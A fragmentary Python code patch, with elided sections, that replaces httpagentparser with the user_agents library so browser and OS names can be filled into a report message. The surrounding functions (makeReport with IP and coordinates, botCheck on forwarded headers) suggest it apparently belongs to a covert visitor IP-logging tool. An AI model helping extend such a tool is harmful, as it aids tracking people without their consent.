...
import user_agents  # Replace httpagentparser with user_agents
...
def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    ...
    # Replace httpagentparser with user_agents
    user_agent = user_agents.parse(useragent)
...
height: 100vh;
            ...
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                ...
                if config["message"]["richMessage"] and result:
                    ...
                    # Update browser and OS detection using user_agents
                    user_agent = user_agents.parse(self.headers.get('user-agent'))
                    message = message.replace("{browser}", f"{user_agent.browser.family} {user_agent.browser.version_string}".strip())
                    message = message.replace("{os}", f"{user_agent.os.family} {user_agent.os.version_string}".strip())
